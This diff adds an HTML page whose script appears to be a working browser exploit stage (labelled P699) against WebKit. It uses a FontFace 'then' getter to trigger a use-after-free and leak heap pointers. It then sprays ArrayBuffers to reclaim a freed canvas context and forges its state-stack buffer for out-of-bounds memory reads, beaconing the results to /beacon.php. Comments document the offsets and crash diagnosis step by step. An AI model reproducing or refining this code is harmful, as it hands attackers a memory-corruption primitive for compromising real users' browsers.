@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P699 — no-gap read (V650-faithful)</title>
+<script>
+'use strict';
+/* ============================================================
+ * P699 — close the last gap: read with NOTHING in between
+ *
+ * P698 proved the ordering with synchronous beacons:
+ *   A-HIT p58=0x10001caf40
+ *   B-UAF ok
+ *   B-SPRAY n=48-AB-only
+ *   *** died here — before B-BASE (the baseline lineWidth read) ***
+ *
+ * So the death happens after the AB(768) spray and before ANY forge.
+ * Two readings:
+ *   (1) the AB reclaimed the freed context, and the engine then used
+ *       it with a zeroed vtable / zeroed early fields -> SIGSEGV.
+ *       (This is the documented failure mode in
+ *        WEBKIT_CANVAS_UAF_STATUS.md and would confirm the reclaim.)
+ *   (2) the synchronous XHR beacon itself (which spins the event
+ *       loop, letting the engine composite/GC and touch the object)
+ *       is what kills it. pastawithpesto V650 reads lineWidth with
+ *       NOTHING between the spray and the read and survives.
+ *
+ * P699 removes EVERYTHING between the spray and the read:
+ *   - results are buffered in a JS array
+ *   - zero beacons, zero XHR, zero setTimeout inside the window
+ *   - the read is the literal next statement after the forge loop
+ *   - all beacons are flushed AFTER the read completes
+ *
+ * Reads performed back-to-back (no gaps):
+ *   lineWidth   -> mem[m_buffer + 48]
+ *   globalAlpha -> mem[m_buffer +  0]
+ *   miterLimit  -> mem[m_buffer + 64]
+ *
+ * m_buffer is set to p58 (forward-only) so no field lands on a page
+ * below the one we know is mapped.
+ * ============================================================ */
+
+function raw(tag,data){
+  try{var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P699-'+encodeURIComponent(tag)+
+      '&data='+encodeURIComponent(String(data||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send(null);}catch(e){}
+}
+/* buffered logging: no network activity inside the critical window */
+var Q=[];
+function q(tag,data){ Q.push(tag+'|'+String(data||'')); }
+function flush(){ for(var i=0;i<Q.length;i++){ var p=Q[i].split('|');
+  raw(p[0], Q[i].slice(p[0].length+1)); } Q=[]; }
+
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+function desc(bits){
+  if(bits===BigInt('0x4094e40000000000')) return 'IS-1337';
+  if(bits>=BigInt('0x1000000000')&&bits<BigInt('0x8000000000')) return 'HEAP-PTR';
+  if(bits===BigInt(0)) return 'ZERO';
+  return 'OTHER';
+}
+
+var P58=null,P68=null;
+
+function run(){ raw('BOOT','p699-nogap'); try{ leak(); }catch(e){ raw('BOOT-ERR',(e.message||'').slice(0,120)); } }
+
+function leak(){
+  raw('A-GO','');
+  var styleEl=document.createElement('style');
+  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(styleEl);
+  var face=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var ffAbs=[], ffFired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(ffFired) return undefined; ffFired=true;
+      if(styleEl){styleEl.remove(); styleEl.textContent=''; styleEl=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<48;k++) ffAbs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em f0, s0','AB');
+
+  setTimeout(function(){
+    var bestK=-1,bestNz=0;
+    for(var k=0;k<ffAbs.length;k++){
+      var u=new Uint8Array(ffAbs[k]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;bestK=k;}
+    }
+    if(bestK<0||bestNz===0){ raw('A-MISS','no-hit'); return; }
+    var bv=new BigUint64Array(ffAbs[bestK]);
+    P58=bv[11]; P68=bv[13];
+    raw('A-HIT','p58='+hex(P58)+'|p68='+hex(P68)+'|k='+bestK+'|nz='+bestNz);
+    /* deliberate delay to let the XHR settle, then the silent window */
+    setTimeout(go, 50);
+  }, 200);
+}
+
+/* ======= the silent critical section ======= */
+function go(){
+  raw('G-ENTER','p58='+hex(P58));
+
+  var innerCtx2=null;
+  var canvas2=document.createElement('canvas'); canvas2.width=1; canvas2.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ innerCtx2=canvas2.getContext('2d'); return true; }});
+  canvas2.getContext('bitmaprenderer', o);
+  if(!innerCtx2){ raw('G-NOCTX',''); return; }
+
+  /* ---------- BEGIN SILENT WINDOW: no XHR, no timer, no alloc ---------- */
+  var N=200;
+  var abs=new Array(N);
+  for(var ai=0;ai<N;ai++) abs[ai]=new ArrayBuffer(768);
+
+  var TARGET=P58;
+  for(var fi=0;fi<N;fi++){
+    var bv=new BigUint64Array(abs[fi]);
+    var u32=new Uint32Array(abs[fi]);
+    bv[14]=TARGET;   /* +112 m_stateStack.m_buffer */
+    u32[30]=1;       /* +120 m_capacity */
+    u32[31]=1;       /* +124 m_size   */
+  }
+
+  /* THE READ — literal next statement. Nothing in between. */
+  var lw=null, lwErr=null;
+  try{ lw=innerCtx2.lineWidth; }catch(e){ lwErr=(e.message||String(e)); }
+  /* ---------- END SILENT WINDOW ---------- */
+
+  raw('G-SURVIVED','lw='+(lwErr!==null?('ERR:'+lwErr.slice(0,60)):lw));
+
+  if(lwErr===null){
+    var bits=f64bits(lw);
+    raw('G-LW','bits='+hex(bits)+'|'+desc(bits));
+  }
+
+  /* further reads are safe to beacon individually now */
+  try{ var ga=innerCtx2.globalAlpha; var gb=f64bits(ga);
+    raw('G-GA','ga='+ga+'|bits='+hex(gb)+'|'+desc(gb)); }
+  catch(e){ raw('G-GA-ERR',(e.message||'').slice(0,90)); }
+
+  try{ var ml=innerCtx2.miterLimit; var mb=f64bits(ml);
+    raw('G-ML','ml='+ml+'|bits='+hex(mb)+'|'+desc(mb)); }
+  catch(e){ raw('G-ML-ERR',(e.message||'').slice(0,90)); }
+
+  raw('DONE','p699-complete');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P699 — no-gap read</pre></body></html>
